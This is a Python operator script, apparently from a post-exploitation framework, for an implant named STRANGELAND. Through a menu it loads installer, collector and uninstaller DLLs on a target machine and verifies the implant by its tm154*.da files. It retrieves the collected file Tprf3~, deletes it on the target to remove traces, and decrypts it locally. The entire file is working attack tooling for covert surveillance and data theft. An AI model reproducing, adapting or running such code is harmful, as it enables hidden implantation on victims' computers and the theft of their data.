
import dsz.version.checks
import dsz.lp
import dsz.version
import dsz.ui
import dsz.path
import dsz.file
import dsz.control
import dsz.menu
import dsz.env
tool = 'StLa'
version = '1.2.0.1'
resDir = dsz.lp.GetResourcesDirectory()
logdir = dsz.lp.GetLogsDirectory()
STLA_PATH = ('%s%s' % (resDir, tool))

def stlaverify(input):
    storageSuccessFlag = True
    success = True
    if dsz.file.Exists('tm154d.da', ('%s\\..\\temp' % systemPath)):
        dsz.ui.Echo('tm154d.da dump file exists ... this should not be here', dsz.ERROR)
    if dsz.file.Exists('tm154p.da', ('%s\\..\\temp' % systemPath)):
        dsz.ui.Echo('tm154p.da overflow file exists ... log may be full', dsz.ERROR)
    if dsz.file.Exists('tm154_.da', ('%s\\..\\temp' % systemPath)):
        dsz.ui.Echo('tm154_.da config file exists ... ', dsz.GOOD)
    if dsz.file.Exists('tm154o.da', ('%s\\..\\temp' % systemPath)):
        dsz.ui.Echo('tm154o.da storage file exists ... SUCCESSFUL', dsz.GOOD)
    else:
        dsz.ui.Echo('tm154o.da storage file missing ... FAILED', dsz.ERROR)
        storageSuccessFlag = False
    if (storageSuccessFlag == True):
        dsz.ui.Echo('STRANGELAND should be installed on target... only way to confirm is with DOUBLEFEATURE', dsz.GOOD)
    else:
        dsz.ui.Echo("STRANGELAND doesn't look like it is on target... only way to confirm is with DOUBLEFEATURE", dsz.ERROR)
        success = False
    return success

def dll_u(dllfile):
    dsz.ui.Echo(('Executing %s via dllload -export dll_u' % dllfile))
    dsz.control.echo.Off()
    runsuccess = dsz.cmd.Run(('dllload -export dll_u -library "%s"' % dllfile))
    dsz.control.echo.On()
    if (not runsuccess):
        dsz.ui.Echo(('Could not execute %s via dll_u' % dllfile), dsz.ERROR)
        return False
    dsz.ui.Echo(('Successfully executed %s via dll_u' % dllfile), dsz.GOOD)
    return True

def collectfiles():
    dsz.control.echo.Off()
    runsuccess = dsz.cmd.Run('processinfo -minimal', dsz.RUN_FLAG_RECORD)
    dsz.control.echo.On()
    (currentPath, file) = dsz.path.Split(dsz.cmd.data.Get('processinfo::modules::module::modulename', dsz.TYPE_STRING)[0])
    dsz.ui.Echo(('Getting collection file, "%s\\Tprf3~"' % currentPath))
    dsz.control.echo.Off()
    runsuccess = dsz.cmd.Run(('get "%s\\Tprf3~"' % currentPath), dsz.RUN_FLAG_RECORD)
    dsz.control.echo.On()
    if (not runsuccess):
        dsz.ui.Echo(('Could not get collection file, %s\\Tprf3~. You may need to collect and clean this manually.' % currentPath), dsz.ERROR)
        return False
    getfilename = dsz.cmd.data.Get('FileLocalName::localname', dsz.TYPE_STRING)[0]
    dsz.ui.Echo(('Deleting collection file, %s\\Tprf3~' % currentPath))
    dsz.control.echo.Off()
    if (not dsz.cmd.Run(('delete "%s\\Tprf3~"' % currentPath))):
        dsz.ui.Echo(('Could not delete collection file, "%s\\Tprf3~". You may need to clean this manually.' % currentPath), dsz.ERROR)
    dsz.control.echo.On()
    dsz.ui.Echo('Moving file to NOSEND directory...')
    dsz.control.echo.Off()
    dsz.cmd.Run(('local mkdir %s\\GetFiles\\NOSEND' % logdir))
    dsz.cmd.Run(('local mkdir %s\\GetFiles\\STRANGELAND_Decrypted' % logdir))
    if (not dsz.cmd.Run(('local move %s\\GetFiles\\%s %s\\GetFiles\\NOSEND\\%s' % (logdir, getfilename, logdir, getfilename)))):
        dsz.ui.Echo('Failed to move files to NOSEND', dsz.ERROR)
    dsz.control.echo.On()
    return parsefile(('%s\\GetFiles\\NOSEND\\%s' % (logdir, getfilename)))

def parsefile(file):
    (path, filename) = dsz.path.Split(file)
    dsz.control.echo.Off()
    runsuccess = dsz.cmd.Run(('local run -command "%s\\Tools\\i386-winnt\\SlDecoder.exe %s %s\\GetFiles\\STRANGELAND_Decrypted\\%s.xml"' % (STLA_PATH, file, logdir, filename)), dsz.RUN_FLAG_RECORD)
    dsz.control.echo.On()
    if (not runsuccess):
        dsz.ui.Echo('There was an error parsing the collection', dsz.ERROR)
    return runsuccess

def stlaparse(input):
    fullpath = dsz.ui.GetString('Please enter the full path to the file you want parse: ', '')
    if (fullpath == ''):
        dsz.ui.Echo('No string entered', dsz.ERROR)
        return False
    return parsefile(fullpath)

def stlainstall(input):
    if dsz.version.checks.IsOs64Bit():
        dll_path = 'Uploads\\x64\\mssli64.dll'
    else:
        dll_path = 'Uploads\\i386\\mssli.dll'
    return dll_u(('%s\\%s' % (STLA_PATH, dll_path)))

def stlacollect(input):
    if dsz.version.checks.IsOs64Bit():
        dll_path = 'Uploads\\x64\\mssld64.dll'
    else:
        dll_path = 'Uploads\\i386\\mssld.dll'
    if dll_u(('%s\\%s' % (STLA_PATH, dll_path))):
        return collectfiles()
    return False

def stlauninstall(input):
    if dsz.version.checks.IsOs64Bit():
        dll_path = 'Uploads\\x64\\msslu64.dll'
    else:
        dll_path = 'Uploads\\i386\\msslu.dll'
    if (not dll_u(('%s\\%s' % (STLA_PATH, dll_path)))):
        dsz.ui.Echo('Failed to load the uninstaller. Process aborted.', dsz.ERROR)
        return False
    if (not collectfiles()):
        dsz.ui.Echo('Failed to collect and parse file.', dsz.ERROR)
    if dsz.file.Exists('tm154*.da', ('%s\\..\\temp' % systemPath)):
        dsz.ui.Echo('tm154*.da files exist, deleting')
        dsz.control.echo.Off()
        if (not dsz.cmd.Run(('delete -mask tm154*.da -path "%s\\..\\temp" -max 1' % systemPath))):
            dsz.ui.Echo('Failed to delete tm154*.da', dsz.ERROR)
        dsz.control.echo.On()
    return True

def main():
    menuOption = 0
    if dsz.version.checks.IsOs64Bit():
        architecture = 'x64'
    else:
        architecture = 'x86'
    if dsz.path.windows.GetSystemPath():
        global systemPath
        systemPath = dsz.path.windows.GetSystemPath()
    else:
        dsz.ui.Echo('Could not find system path', dsz.ERROR)
        return 0
    menu_list = list()
    menu_list.append({dsz.menu.Name: 'Install', dsz.menu.Function: stlainstall})
    menu_list.append({dsz.menu.Name: 'Uninstall', dsz.menu.Function: stlauninstall})
    menu_list.append({dsz.menu.Name: 'Verify Install', dsz.menu.Function: stlaverify})
    menu_list.append({dsz.menu.Name: 'Collect and Parse', dsz.menu.Function: stlacollect})
    menu_list.append({dsz.menu.Name: 'Parse Local', dsz.menu.Function: stlaparse})
    while (menuOption != (-1)):
        (retvalue, menuOption) = dsz.menu.ExecuteSimpleMenu(('\n\n===============================\nSTRANGELAND v%s %s Menu\n===============================\n' % (version, architecture)), menu_list)
        if (menuOption == 0):
            if (retvalue == True):
                dsz.lp.RecordToolUse(tool, version, 'DEPLOYED', 'Successful')
            if (retvalue == False):
                dsz.lp.RecordToolUse(tool, version, 'DEPLOYED', 'Unsuccessful')
        elif (menuOption == 1):
            if (retvalue == True):
                dsz.lp.RecordToolUse(tool, version, 'DELETED', 'Successful')
            if (retvalue == False):
                dsz.lp.RecordToolUse(tool, version, 'DELETED', 'Unsuccessful')
        elif (menuOption == 2):
            if (retvalue == True):
                dsz.lp.RecordToolUse(tool, version, 'EXERCISED', 'Successful')
            if (retvalue == False):
                dsz.lp.RecordToolUse(tool, version, 'EXERCISED', 'Unsuccessful')
        elif (menuOption == 3):
            if (retvalue == True):
                dsz.lp.RecordToolUse(tool, version, 'EXERCISED', 'Successful')
            if (retvalue == False):
                dsz.lp.RecordToolUse(tool, version, 'EXERCISED', 'Unsuccessful')
    dsz.ui.Echo('**********************************')
    dsz.ui.Echo('*  STRANGELAND script completed. *')
    dsz.ui.Echo('**********************************')
    return 0
if (__name__ == '__main__'):
    main()